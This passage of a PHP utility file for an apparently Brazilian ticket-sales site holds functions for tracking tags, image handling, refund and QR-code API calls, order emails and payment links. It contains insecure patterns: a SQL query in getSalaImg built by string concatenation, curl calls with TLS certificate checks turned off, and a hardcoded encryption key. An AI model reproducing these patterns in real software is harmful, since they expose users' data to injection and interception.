        $id = '8741';
        break;
    case "2._Conferir_Itens_-_Voltar":
        $id = '8742';
        break;
    case "3._Identificaçao_-_Autentique-se":
        $id = '8744';
        break;
    case "3._Identificaçao_-_Cadastre-se-TAG":
        $id = '8743';
        break;
    case "4._Confirmaçao_-_Avançar-TAG":
        $id = '8747';
        break;
    case "4._Confirmaçao_-_Alterar_pedido-TAG":
        $id = '8748';
        break;
    case "5._Pagamento_-_Voltar-TAG":
        $id = '8749';
        break;
    case "Cadastro_com_sucesso-TAG":
        $id = '8745';
        break;
    case "Cadastro_-_Voltar-TAG":
        $id = '8746';
        break;
    case "Pagamento_efetuado_com_sucesso-TAG":
        $id = '8750';
        break;
    }

    $script = ($id) ? '<!-- SCRIPT TAG -->
            <script language="JavaScript" type="text/JavaScript">
            var ADM_rnd_' . $id . ' = Math.round(Math.random() * 9999);
            var ADM_post_' . $id . ' = new Image();
            ADM_post_' . $id . '.src = \'https://ia.nspmotion.com/ptag/?pt=' . $id . '&r=\'+ADM_rnd_' . $id . ';
            </script>
            <!-- END SCRIPT TAG -->' : '';
    return (isset($_GET['tag']) ? array(
    'tag_avancar' => ($tag_avancar ? "&tag=" . $tag_avancar : ''),
    'tag_voltar' => ($tag_voltar ? "&tag=" . $tag_voltar : ''),
    'script' => $script
    ) : array());
}




function cropImageResource($img, $hex=null){
    if($hex == null) $hex = imagecolorat($img, 0,0);
    $width = imagesx($img);
    $height = imagesy($img);
    $b_top = 0;
    $b_lft = 0;
    $b_btm = $height - 1;
    $b_rt = $width - 1;

    //top
    for(; $b_top < $height; ++$b_top) {
        for($x = 0; $x < $width; ++$x) {
            if(imagecolorat($img, $x, $b_top) != $hex) {
                break 2;
            }
        }
    }

    // return false when all pixels are trimmed
    if ($b_top == $height) return false;

    // bottom
    for(; $b_btm >= 0; --$b_btm) {
        for($x = 0; $x < $width; ++$x) {
            if(imagecolorat($img, $x, $b_btm) != $hex) {
                break 2;
            }
        }
    }

    // left
    for(; $b_lft < $width; ++$b_lft) {
        for($y = $b_top; $y <= $b_btm; ++$y) {
            if(imagecolorat($img, $b_lft, $y) != $hex) {
                break 2;
            }
        }
    }

    // right
    for(; $b_rt >= 0; --$b_rt) {
        for($y = $b_top; $y <= $b_btm; ++$y) {
            if(imagecolorat($img, $b_rt, $y) != $hex) {
                break 2;
            }
        }
    }

    $b_btm++;
    $b_rt++;
    $box = array(
        'l' => $b_lft,
        't' => $b_top,
        'r' => $b_rt,
        'b' => $b_btm,
        'w' => $b_rt - $b_lft,
        'h' => $b_btm - $b_top
    );

    $img2 = imagecreate($box['w'], $box['h']);
    imagecopy($img2, $img, 0, 0, $box['l'], $box['t'], $box['w'], $box['h']);

    return $img2;
}

function requestImage($url) {
    $ch = curl_init();

    curl_setopt ($ch, CURLOPT_URL, $url);
    curl_setopt ($ch, CURLOPT_BINARYTRANSFER, true);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt ($ch, CURLOPT_HEADER, false);
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);

    $rawdata = curl_exec($ch);
    $image = imagecreatefromstring($rawdata);

    curl_close($ch);

    /*/===== REMOVER MARCA DAGUA =====
    $offset_x = 0;
    $offset_y = 0;

    $new_width = imagesx($image);
    $new_height = imagesy($image) - 20;

    $new_image = imagecreate($new_width, $new_height);
    imagecopy($new_image, $image, 0, 0, $offset_x, $offset_y, $new_width, $new_height);

    $image = $new_image;
    //===== REMOVER MARCA DAGUA =====*/

    return $image;
}

function callapi_refund($id_pedido_venda) {
    //die(json_encode($id_pedido_venda));
    
    $transaction_data = array("id_pedido_venda" => $id_pedido_venda);

    $url = getconf()["api_internal_uri"]."/v1/purchase/site/refund?imthebossofme=".gethost();        

    $post_data = $transaction_data;
    // $out = fopen('php://output', 'w');
    $curl = curl_init(); 
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");                                                                     
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);                                                                      
    // curl_setopt($curl, CURLOPT_VERBOSE, true);
    // curl_setopt($curl, CURLOPT_STDERR, $out);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post_data));   

    $response = curl_exec($curl);
    // fclose($out);
    $errno = curl_errno($curl);
    //die(json_encode($response));
    
    $json = json_decode($response);
    
    curl_close($curl);
    return $json->success;
}

function getQRCodeFromAPI($id_base, $codVenda, $indice) {
    $uri = getconf()["api_internal_uri"]."/v1/print/qrcode";
    $fulluri = $uri."?id_base=".$id_base."&codVenda=".$codVenda."&indice=".$indice;
    //return "".$fulluri;
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $fulluri); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    $output = curl_exec($ch);
    $aux = json_decode($output);
    curl_close($ch); 
    return $aux[0]->qrcode;
}

function encodeToBarcode($text, $type = 'Aztec', $properties = array()) {
    if (empty($text)) return false;
    
    if ($type == 'Aztec') {
        $code = Encoder::encode($text);
        $renderer = new PngRenderer();

        $image = imagecreatefromstring($renderer->render($code));
    }

    return $image;
}

function saveAndGetPath($image, $name) {
    $path = '../images/temp/' . $name . '.png';

    $png = imagepng($image, $path);

    return $path;
}

function getBase64ImgString($path) {
    if (!file_exists($path)) return false;

    $type = pathinfo($path, PATHINFO_EXTENSION);
    $data = file_get_contents($path);

    return 'data:image/' . $type . ';base64,' . base64_encode($data);
}

function normalize_string($string) {
    // remove whitespace, leaving only a single space between words. 
    $string = preg_replace('/\s+/', ' ', $string);
    // flick diacritics off of their letters
    $string = preg_replace('~&([a-z]{1,2})(?:acute|cedil|circ|grave|lig|orn|ring|slash|th|tilde|uml|caron);~i', '$1', htmlentities($string, ENT_COMPAT, 'UTF-8'));
    return $string;
}

function verificaDisponibilidadeDoSite() {
    if ($is_manutencao === true) {
        header("Location: manutencao.php");
        die();
    }
}


function comboGateway($name, $gateway = ""){
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "SELECT ID_GATEWAY, DS_GATEWAY, IN_EXIBE_USUARIO FROM MW_GATEWAY WHERE IN_EXIBE_USUARIO = '1'");

    $combo = '<select name="' . $name . '[]" class="inputStyle '. $name .'" id="' . $name . '"><option>Selecione...</option>';
    while ($rs = fetchResult($result)) {
        $selecionavel = "";
        if($gateway == $rs['ID_GATEWAY']){
            $selecionavel = "selected";
        }
        $combo .= '<option value="' . $rs['ID_GATEWAY'] . '" '. $selecionavel .'>' . utf8_encode2($rs["DS_GATEWAY"]) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function getEvento($id_evento) {
    $mainConnection = mainConnection();
    $query = "SELECT
    e.id_evento
    ,e.ds_evento
    ,g.name genero
    ,le.ds_local_evento nome_teatro
    ,le.ds_googlemaps endereco
    ,m.ds_municipio cidade
    ,es.sg_estado sigla_estado
    ,es.ds_estado
    FROM CI_MIDDLEWAY..mw_evento e
    LEFT JOIN CI_MIDDLEWAY..mw_evento_extrainfo eei ON e.id_evento=eei.id_evento
    LEFT JOIN CI_MIDDLEWAY..genre g ON eei.id_genre=g.id
    LEFT JOIN CI_MIDDLEWAY..mw_local_evento le ON e.id_local_evento=le.id_local_evento
    LEFT JOIN CI_MIDDLEWAY..mw_municipio m ON le.id_municipio=m.id_municipio
    LEFT JOIN CI_MIDDLEWAY..mw_estado es ON m.id_estado=es.id_estado
    WHERE 
    e.id_evento=?";

    $params = array($id_evento);
    $rs = executeSQL($mainConnection, $query, $params, true);

    return $rs;

    $query_mysql = "SELECT
                        e.duracao,
                        g.nome as genero,
                        cl.nome as classificacao,
                        t.nome as nome_teatro,
                        t.endereco,
                        t.bairro,
                        ci.nome as cidade,
                        ci.estado as sigla_estado
                    FROM espetaculos e
                    INNER JOIN classificacaos cl on cl.id = e.classificacao_id
                    INNER JOIN generos g on g.id = e.genero_id
                    INNER JOIN teatros t on t.id = e.teatro_id
                    INNER JOIN cidades ci on ci.id = t.cidade_id
                    WHERE cc_id = :id";

    $pdo = getConnectionHome();

    if ($pdo !== false) {

        $stmt = $pdo->prepare($query_mysql);
        $stmt->bindParam(':id', $id_evento);
        $stmt->execute();

        return $stmt->fetch();

    }

    return false;
}

function getEnderecoCliente($id_cliente, $id_endereco) {
    $mainConnection = mainConnection();

    if ($id_endereco == -1) {
        $query = 'SELECT DS_ENDERECO, DS_COMPL_ENDERECO, DS_BAIRRO, DS_CIDADE, CD_CEP, ID_ESTADO, NR_ENDERECO
                    FROM MW_CLIENTE
                    WHERE ID_CLIENTE = ?';
        $params = array($_SESSION['user']);
        $rs = executeSQL($mainConnection, $query, $params, true);

        //Se algum dados do endereço realmente foi preenchido, exibir. Se nada foi, não irá exibir
        $valida = false;
        foreach ($rs as $field){
            if ( !empty($field) ){ $valida = true; }
        }

        if ($valida) {
            $rs['ID_ENDERECO_CLIENTE'] = -1;
            $rs['NM_ENDERECO'] = 'Endere&ccedil;o do cadastro';
        }else{
            $rs = array();
        }

    } else {
        $query = 'SELECT ID_ENDERECO_CLIENTE, DS_ENDERECO, DS_COMPL_ENDERECO, DS_BAIRRO, DS_CIDADE, CD_CEP, ID_ESTADO, NM_ENDERECO, NR_ENDERECO
                FROM MW_ENDERECO_CLIENTE
                WHERE ID_CLIENTE = ? AND ID_ENDERECO_CLIENTE = ?';
        $params = array($id_cliente, $id_endereco);
        $rs = executeSQL($mainConnection, $query, $params, true);
    }

    if ( !empty($rs) )
    {
        $retorno = array(
            'endereco' => $rs['DS_ENDERECO'],
            'numero' => $rs['NR_ENDERECO'],
            'bairro' => $rs['DS_BAIRRO'],
            'cidade' => $rs['DS_CIDADE'],
            'estado' => $rs['ID_ESTADO'],
            'cep' => $rs['CD_CEP'],
            'nome' => $rs['NM_ENDERECO'],
            'complemento' => $rs['DS_COMPL_ENDERECO'],
            'id' => $rs['ID_ENDERECO_CLIENTE']
        );

        foreach ($retorno as $key => $val) {
            $retorno[$key] = utf8_encode2($val);
        }
    }
    else{
        $retorno = $rs;
    }

    return $retorno;
}

function getCartaoImgURL($nm_cartao_exibicao_site) {

    $nm_cartao_exibicao_site = remove_accents($nm_cartao_exibicao_site, false);
    $nm_cartao_exibicao_site = preg_replace('/\s+/', '_', $nm_cartao_exibicao_site);

    $file_name = 'ico_'.$nm_cartao_exibicao_site.'.png';
    $path = '../images/cartoes/';
    
    return $path.(file_exists($path.$file_name) ? $file_name : 'ico_default.png');
}

function limparImagesTemp() {
    $dir_name = '../images/temp/';

    $files = array_diff(scandir($dir_name), array('..', '.'));

    foreach ($files as $key => $value) {
        // todos os gif
        if (pathinfo($dir_name.$value, PATHINFO_EXTENSION) == 'gif') {
            // hora anterior ou mais velhos
            if (filemtime($dir_name.$value) < strtotime('-3 hour')) {
                unlink($dir_name.$value);
            }
        }
    }
}

function limparTempAdmin() {
    $dir_name = '../admin/temp/';

    $files = array_diff(scandir($dir_name), array('..', '.'));

    foreach ($files as $key => $value) {
        // se for um diretorio
        if (is_dir($dir_name.$value)) {
            // hora anterior ou mais velhos
            if (filemtime($dir_name.$value.'/.') < strtotime('-3 hour')) {
                delTree($dir_name.$value);
            }
        }
    }
}

function delTree($dir) { 
    $files = array_diff(scandir($dir), array('.','..')); 
    foreach ($files as $file) { 
        (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
    } 
    return rmdir($dir); 
} 

function limparCookies() {
    setcookie('pedido', '', -1);
    setcookie('id_braspag', '', -1);
    setcookie('entrega', '', -1);
    setcookie('binItau', '', -1);

    setcookie('mc_eid', '', -1);
    setcookie('mc_cid', '', -1);

    setcookie('hotsite', '', -1);
}

function getIdClienteBaseSelecionada($idBase){
    $mainConnection = mainConnection();
    $query = "SELECT ID_CLIENTE FROM MW_BASE WHERE ID_BASE = ?";
    $param = array($idBase);

    if(empty($idBase)){    
        $error = "IdBase é um valor inválido.";
    }else{
        $result = executeSQL($mainConnection, $query, $param, true);
        $error = sqlErrors();
        $error = $error[0]['message'];
    }   
        
    if(empty($error)){
        $idCliente = $result["ID_CLIENTE"];
    }else{
        trigger_error($error, E_USER_ERROR);
        die();
    }

    return $idCliente;
}

function sendErrorMail($subject, $message) {
    $namefrom = multiSite_getTitle();
    $from = '';

    $cc = array('Jefferson => jefferson.ferreira@intuiti.com.br', 'Edicarlos => edicarlos.barbosa@intuiti.com.br');

    authSendEmail($from, $namefrom, 'gabriel.monteiro@intuiti.com.br', 'Gabriel', $subject, $message, $cc);
}

function sendConfirmationMail($id_cliente, $assinatura = false) {
    $mainConnection = mainConnection();

    $query = "SELECT C.DS_NOME, C.CD_EMAIL_LOGIN, replace(newid(),'-','') CD_CONFIRMACAO
                FROM MW_CLIENTE C
                LEFT JOIN MW_CONFIRMACAO_EMAIL E ON E.ID_CLIENTE = C.ID_CLIENTE
                WHERE C.ID_CLIENTE = ?";
    $rs = executeSQL($mainConnection, $query, array($id_cliente), true);

    if ($rs['CD_CONFIRMACAO'] == null) {
        require_once('../settings/Cypher.class.php');

        $cipher = new Cipher('1ngr3ss0s');
        $rs['CD_CONFIRMACAO'] = $cipher->encrypt($rs['CD_EMAIL_LOGIN'].'_'.time());

        $query = "INSERT INTO MW_CONFIRMACAO_EMAIL VALUES (?, ?, GETDATE())";
        executeSQL($mainConnection, $query, array($id_cliente, $rs['CD_CONFIRMACAO']), true);
    }

    require('../settings/settings.php');
    require_once('../settings/Template.class.php');

    //die("aqui: ".json_encode(getwhitelabelobj()["templates"]["email"]["confirmation"]));
    $caminhoHtml = getwhitelabeltemplate("email:confirmation");
    //$caminhoHtml = ($assinatura ? getwhitelabeltemplate("email:signature") : );

    $tpl = new Template($caminhoHtml);
    $tpl->nome = $rs['DS_NOME'];
    $tpl->codigo = $rs['CD_CONFIRMACAO'];
    $tpl->link = multiSite_getURICompra("/comprar/confirmacaoEmail.php?codigo=".urlencode($rs['CD_CONFIRMACAO']));

    if ($_REQUEST['redirect']) {
        $tpl->link .= '&redirect='.urlencode($_REQUEST['redirect']);
    }

    $subject = 'Confirmação de e-mail';

    ob_start();
    $tpl->show();
    $message = ob_get_clean();

    $namefrom = multiSite_getTitle();
    $from = '';

    $successMail = authSendEmail($from, $namefrom, $rs['CD_EMAIL_LOGIN'], $rs['DS_NOME'], $subject, utf8_decode($message));

    return $successMail;
}

// ----------------------------

function sendSuccessMail($pedido_id) {
    $mainConnection = mainConnection();

    $query = "SELECT
                    C.DS_NOME + ' ' + C.DS_SOBRENOME AS DS_NOME,
                    CONVERT(VARCHAR(10), PV.DT_PEDIDO_VENDA, 103) AS DT_PEDIDO_VENDA,
                    VL_TOTAL_PEDIDO_VENDA,
                    MP.CD_MEIO_PAGAMENTO,
                    C.CD_CPF,
                    C.DS_DDD_TELEFONE,
                    C.DS_TELEFONE,
                    C.DS_DDD_CELULAR,
                    C.DS_CELULAR,
                    C.DS_ENDERECO,
                    C.DS_COMPL_ENDERECO,
                    C.DS_BAIRRO,
                    C.DS_CIDADE,
                    E.SG_ESTADO,
                    C.CD_CEP,
                    PV.DS_ENDERECO_ENTREGA,
                    PV.DS_COMPL_ENDERECO_ENTREGA,
                    PV.DS_BAIRRO_ENTREGA,
                    PV.DS_CIDADE_ENTREGA,
                    PV.CD_CEP_ENTREGA,
                    PV.IN_RETIRA_ENTREGA,
                    PV.NM_CLIENTE_VOUCHER,
                    PV.DS_EMAIL_VOUCHER,
                    C.CD_EMAIL_LOGIN
                FROM MW_PEDIDO_VENDA PV
                INNER JOIN MW_CLIENTE C ON PV.ID_CLIENTE = C.ID_CLIENTE
                LEFT JOIN MW_MEIO_PAGAMENTO MP ON PV.ID_MEIO_PAGAMENTO = MP.ID_MEIO_PAGAMENTO
                LEFT JOIN MW_ESTADO E ON C.ID_ESTADO = E.ID_ESTADO
                WHERE PV.ID_PEDIDO_VENDA = ?";
    $params = array($pedido_id);
    $rsDados = executeSQL($mainConnection, $query, $params, true);

    foreach ($rsDados as $key => $value) {
        if (gettype($value) == 'string') {
            $rsDados[$key] = $value;
        }
    }

    $parametros['OrderData']['OrderId'] = $pedido_id;
    $parametros['CustomerData']['CustomerName'] = $rsDados['DS_NOME'];
    $valores['date'] = $rsDados['DT_PEDIDO_VENDA'];
    $PaymentDataCollection['Amount'] = $rsDados['VL_TOTAL_PEDIDO_VENDA'] * 100;
    $PaymentDataCollection['PaymentMethod'] = $rsDados['CD_MEIO_PAGAMENTO'];
    $parametros['CustomerData']['CustomerIdentity'] = $rsDados['CD_CPF'];
    $parametros['CustomerData']['CustomerEmail'] = $rsDados['CD_EMAIL_LOGIN'];
    $dadosExtrasEmail['cpf_cnpj_cliente'] = $parametros['CustomerData']['CustomerIdentity'];

    $dadosExtrasEmail['ddd_telefone1'] = $rsDados['DS_DDD_TELEFONE'];
    $dadosExtrasEmail['numero_telefone1'] = $rsDados['DS_TELEFONE'];
    $dadosExtrasEmail['ddd_telefone2'] = $rsDados['DS_DDD_CELULAR'];
    $dadosExtrasEmail['numero_telefone2'] = $rsDados['DS_CELULAR'];

    $dadosExtrasEmail['nome_presente'] = $rsDados['NM_CLIENTE_VOUCHER'];
    $dadosExtrasEmail['email_presente'] = $rsDados['DS_EMAIL_VOUCHER'];

    $parametros['CustomerData']['CustomerAddressData']['Street'] = $rsDados['DS_ENDERECO'];
    $parametros['CustomerData']['CustomerAddressData']['Complement'] = $rsDados['DS_COMPL_ENDERECO'];
    $parametros['CustomerData']['CustomerAddressData']['District'] = $rsDados['DS_BAIRRO'];
    $parametros['CustomerData']['CustomerAddressData']['City'] = $rsDados['DS_CIDADE'];
    $parametros['CustomerData']['CustomerAddressData']['State'] = $rsDados['SG_ESTADO'];
    $parametros['CustomerData']['CustomerAddressData']['Country'] = 'Brasil';
    $parametros['CustomerData']['CustomerAddressData']['ZipCode'] = $rsDados['CD_CEP'];

    if ($rsDados['IN_RETIRA_ENTREGA'] == 'E') {
        $parametros['CustomerData']['DeliveryAddressData']['Street'] = $rsDados['DS_ENDERECO_ENTREGA'];
        $parametros['CustomerData']['DeliveryAddressData']['Complement'] = $rsDados['DS_COMPL_ENDERECO_ENTREGA'];
        $parametros['CustomerData']['DeliveryAddressData']['District'] = $rsDados['DS_BAIRRO_ENTREGA'];
        $parametros['CustomerData']['DeliveryAddressData']['City'] = $rsDados['DS_CIDADE_ENTREGA'];
        $parametros['CustomerData']['DeliveryAddressData']['State'] = $rsDados['SG_ESTADO'];
        $parametros['CustomerData']['DeliveryAddressData']['Country'] = 'Brasil';
        $parametros['CustomerData']['DeliveryAddressData']['ZipCode'] = $rsDados['CD_CEP_ENTREGA'];
    }

    $query = "SELECT R.ID_RESERVA, R.ID_APRESENTACAO, R.ID_APRESENTACAO_BILHETE, R.DS_LOCALIZACAO AS DS_CADEIRA,
                    R.DS_SETOR, E.ID_EVENTO, E.DS_EVENTO, ISNULL(LE.DS_LOCAL_EVENTO, B.DS_NOME_TEATRO) DS_NOME_TEATRO,
                    CONVERT(VARCHAR(10), A.DT_APRESENTACAO, 103) DT_APRESENTACAO, A.HR_APRESENTACAO,
                    AB.VL_LIQUIDO_INGRESSO, AB.DS_TIPO_BILHETE, E.ID_BASE, A.CodApresentacao, R.CodVenda
                FROM MW_ITEM_PEDIDO_VENDA R
                INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = R.ID_APRESENTACAO
                INNER JOIN MW_EVENTO E ON E.ID_EVENTO = A.ID_EVENTO
                INNER JOIN MW_BASE B ON B.ID_BASE = E.ID_BASE
                INNER JOIN MW_APRESENTACAO_BILHETE AB ON AB.ID_APRESENTACAO_BILHETE = R.ID_APRESENTACAO_BILHETE
                LEFT JOIN MW_LOCAL_EVENTO LE ON E.ID_LOCAL_EVENTO = LE.ID_LOCAL_EVENTO
                WHERE R.ID_PEDIDO_VENDA = ? AND A.DT_APRESENTACAO >= CONVERT(VARCHAR, GETDATE(), 112)
                ORDER BY E.DS_EVENTO, R.ID_APRESENTACAO, R.DS_LOCALIZACAO";
    $params = array($pedido_id);
    $result = executeSQL($mainConnection, $query, $params);

    $queryServicos = "SELECT DISTINCT isnull(T.IN_TAXA_POR_PEDIDO, 'N') IN_TAXA_POR_PEDIDO FROM MW_ITEM_PEDIDO_VENDA I
                        INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = I.ID_APRESENTACAO
                        LEFT JOIN MW_TAXA_CONVENIENCIA T ON T.ID_EVENTO = A.ID_EVENTO AND T.DT_INICIO_VIGENCIA <= GETDATE() AND T.IN_TAXA_POR_PEDIDO = 'S'
                        WHERE I.ID_PEDIDO_VENDA = ?";
    $rsServicos = executeSQL($mainConnection, $queryServicos, array($pedido_id), true);

    $itensPedido = array();
    $i = -1;
    while ($itens = fetchResult($result)) {
        $i++;

        if ($i == 0) {
            if ($rsServicos['IN_TAXA_POR_PEDIDO'] == 'S') {
                $valorConveniencia = obterValorServico($itens['ID_APRESENTACAO_BILHETE'], true, $pedido_id);

                $itensPedido[$i]['descricao_item'] = 'Serviço';
                $itensPedido[$i]['valor_item'] = $valorConveniencia;

                $valorConveniencia = 0;
                $i++;
            } else {
                $valorConveniencia = obterValorServico($itens['ID_APRESENTACAO_BILHETE'], false, $pedido_id);
            }
        } else {
            $valorConveniencia = obterValorServico($itens['ID_APRESENTACAO_BILHETE'], false, $pedido_id);
        }

        $itensPedido[$i]['descricao_item']['evento'] = $itens['DS_EVENTO'];
        $itensPedido[$i]['descricao_item']['data'] = $itens['DT_APRESENTACAO'];
        $itensPedido[$i]['descricao_item']['hora'] = $itens['HR_APRESENTACAO'];
        $itensPedido[$i]['descricao_item']['teatro'] = $itens['DS_NOME_TEATRO'];
        $itensPedido[$i]['descricao_item']['setor'] = $itens['DS_SETOR'];
        $itensPedido[$i]['descricao_item']['cadeira'] = $itens['DS_CADEIRA'];
        $itensPedido[$i]['descricao_item']['bilhete'] = $itens['DS_TIPO_BILHETE'];

        $itensPedido[$i]['valor_item'] = ($itens['VL_LIQUIDO_INGRESSO'] + $valorConveniencia);
        $itensPedido[$i]['id_base'] = $itens['ID_BASE'];
        $itensPedido[$i]['CodApresentacao'] = $itens['CodApresentacao'];
        $itensPedido[$i]['CodVenda'] = $itens['CodVenda'];
        $itensPedido[$i]['id_evento'] = $itens['ID_EVENTO'];
    }

    if ($i >= 0) {

        require "../comprar/successMail.php";

        if ($successMail === true) {
            return true;
        } else {
            return "Erro ao enviar o e-mail.<br/><br/>".$successMail;
        }

    } else {
        return "Não será possível reenviar o e-mail, pois a apresentação já ocorreu.";
    }
}
function endsWith($haystack, $needle) {
    // search forward starting from end minus needle length characters
    if ($needle === '') {
        return true;
    }
    $diff = \strlen($haystack) - \strlen($needle);
    return $diff >= 0 && strpos($haystack, $needle, $diff) !== false;
}
function startsWith($haystack, $needle) {
    // search backwards starting from haystack length characters from the end
    return $needle === ''
      || strrpos($haystack, $needle, -strlen($haystack)) !== false;
}

function getPKPass($dados_pedido) {

    foreach ($dados_pedido as $key => $value) {
        $dados_pedido[$key] = utf8_encode2($value);
    }

    $data = array(  
        "assinatura" => $dados_pedido['assinatura'],
        "number" => $dados_pedido['codigo_pedido'],
        "date" => $dados_pedido['data'],
        "total" => $dados_pedido['total'],
        "espetaculo" => array(  
            "titulo" => $dados_pedido['evento'],
            "endereco" => $dados_pedido['endereco'],
            "nome_teatro" => $dados_pedido['nome_teatro'],
            "horario" => $dados_pedido['horario']
        ),
        "ingressos" => array(
            array(  
                "qrcode" => $dados_pedido['barcode'],
                "local" => $dados_pedido['local_bilhete'],
                "type" => $dados_pedido['tipo_bilhete'],
                "price" => $dados_pedido['preco_bilhete'],
                "service_price" => $dados_pedido['servico_bilhete'],
                "total" => $dados_pedido['total_bilhete']
            )
        )
    );

    $data = json_encode($data);

    $url = ($_ENV['IS_TEST']
        ? "https://mpassbook-homol.herokuapp.com/passes/v2/"
        : "https://mpassbook.herokuapp.com/passes/v2/");

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url.'generate.json');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    $server_output = curl_exec($ch);
    curl_close($ch);

    $response = json_decode($server_output, true);

    return $url.$response['passes'][0];
}

function getFastcashPaymentURL($id_pedido) {
    session_start();
    $mainConnection = mainConnection();

    $query = "SELECT P.VL_TOTAL_PEDIDO_VENDA, C.DS_NOME + ' ' + C.DS_SOBRENOME AS NOME, C.CD_CPF, C.DS_DDD_CELULAR + C.DS_CELULAR AS CELULAR, C.CD_EMAIL_LOGIN, M.CD_MEIO_PAGAMENTO
            FROM MW_PEDIDO_VENDA P
            INNER JOIN MW_CLIENTE C ON C.ID_CLIENTE = P.ID_CLIENTE
            INNER JOIN MW_MEIO_PAGAMENTO M ON M.ID_MEIO_PAGAMENTO = P.ID_MEIO_PAGAMENTO AND M.DS_MEIO_PAGAMENTO LIKE '%FASTCASH%'
            WHERE P.ID_PEDIDO_VENDA = ? AND P.IN_SITUACAO = 'P'";
    $params = array($_GET['pedido']);
    $rs = executeSQL($mainConnection, $query, $params, true);

    // se nao encontrar nenhum registro pode ser
    //  - meio de pagamento != fastcash
    //  - um pedido que nao esta mais em processamento
    if (empty($rs)) return false;

    $prod = 'https://www.fastcash.com.br/paymentframe/2';
    $homolog = 'https://h.fastcash.com.br/paymentframe/2';

    $tid = $_GET['pedido'];//id_pedido
    $pid = 232;
    $prodid = 4691;//3500+
    $valor = number_format($rs['VL_TOTAL_PEDIDO_VENDA'], 2, ',', '');
    $descricao = urlencode('Pedido '.$tid);
    $nome = urlencode($rs['NOME']);
    $cpf = $rs['CD_CPF'];
    $celular = $rs['CELULAR'];
    $email = urlencode($rs['CD_EMAIL_LOGIN']);
    $paymentOptions = ($rs['CD_MEIO_PAGAMENTO'] == 892 ? 'transference' : 'deposit');//transference / deposit / creditcard
    $showHeader = 'false';
    $companyName = urlencode(multiSite_getName());
    $hideCompanyName = 'false';
    $showValue = 'true';
    $showDescription = 'true';
    $hidelogo = 'false';
    $urlLogo = urlencode('https://www.fastcash.com.br/br/imagens/header/logo.png');

    $url = $prod;
    $url .= '/?Tid=' . $tid . '&Pid=' . $pid . '&ProdId=' . $prodid . '&Price=' . $valor . '&Description=' . $descricao . '&Cellphone=' . $celular . '&Name=' . $nome . '&Email=' . $email . '&CPF=' . $cpf . '&PaymentOptions=' . $paymentOptions . '&HideCompanyName=' . $hideCompanyName . '&CompanyName=' . $companyName . '&HideCompanyName=' . $hideCompanyName . '&ShowDescription=' . $showDescription . '&HideLogo=' . $hidelogo . '&urlLogo=' . $urlLogo . '&ShowHeader=' . $showHeader . '&ShowValue=' . $showValue;

    return $url;
}

function pre() {
    echo '<pre>';
    print_r(func_get_args());
    echo '</pre>';
}

function formatCPF($nbr_cpf) {
    $parte_um     = substr($nbr_cpf, 0, 3);
    $parte_dois   = substr($nbr_cpf, 3, 3);
    $parte_tres   = substr($nbr_cpf, 6, 3);
    $parte_quatro = substr($nbr_cpf, 9, 2);

    $monta_cpf = "$parte_um.$parte_dois.$parte_tres-$parte_quatro";

    return $monta_cpf;
}

function getSalaImg($codSala, $conn)
{
    if ( $codSala == 'TODOS' )
    {
        $query = 'SELECT TOP 1 C.Imagem FROM tabSala AS A
                  INNER JOIN tabLogoSala AS B ON A.CodSala = B.CodSala
                  INNER JOIN tabImagem AS C ON C.CodImagem = B.CodImagem
                  WHERE B.CodImagem > 0 AND ISNULL(B.ExibirLogoBordero, 0) = 1';
    }
    else
    {
        $query = 'SELECT TOP 1 Imagem FROM tabLogoSala AS A
                  INNER JOIN tabImagem AS B ON A.CodImagem = B.CodImagem
                  WHERE CodSala = '.$codSala.' AND ISNULL(A.ExibirLogoBordero, 0) = 1';
    }

    $imagem = fetchAssoc( executeSQL($conn, $query) );
    $imagem = $imagem[0]['Imagem'];

    return $imagem;
}

/*
 * Identificar página de referência de uma requisição ajax
 * */
function httpReferer($string){

    $ref = explode('/', $_SERVER['HTTP_REFERER']);

    $ref = explode('.php', $ref[count($ref) - 1] );
    $ref = $ref[0];

    if ($ref == $string) {
        $result = true;
    }else{
        $result = false;
    }

    return $result;
}

/**
 * Unaccent the input string string. An example string like `ÀØėÿᾜὨζὅБю`
 * will be translated to `AOeyIOzoBY`. More complete than :
 *   strtr( (string)$str,
 *          "ÀÁÂÃÄÅàáâãäåÒÓÔÕÖØòóôõöøÈÉÊËèéêëÇçÌÍÎÏìíîïÙÚÛÜùúûüÿÑñ",
 *          "aaaaaaaaaaaaooooooooooooeeeeeeeecciiiiiiiiuuuuuuuuynn" );
 *
 * @param $str input string
 * @param $utf8 if null, function will detect input string encoding
 * @author http://www.evaisse.net/2008/php-translit-remove-accent-unaccent-21001
 * @return string input string without accent
 */
function remove_accents( $str, $utf8=true )
{
    $str = (string)$str;
    if( is_null($utf8) ) {
        if( !function_exists('mb_detect_encoding') ) {
            $utf8 = (strtolower( mb_detect_encoding($str) )=='utf-8');
        } else {
            $length = strlen($str);
            $utf8 = true;
            for ($i=0; $i < $length; $i++) {
                $c = ord($str[$i]);
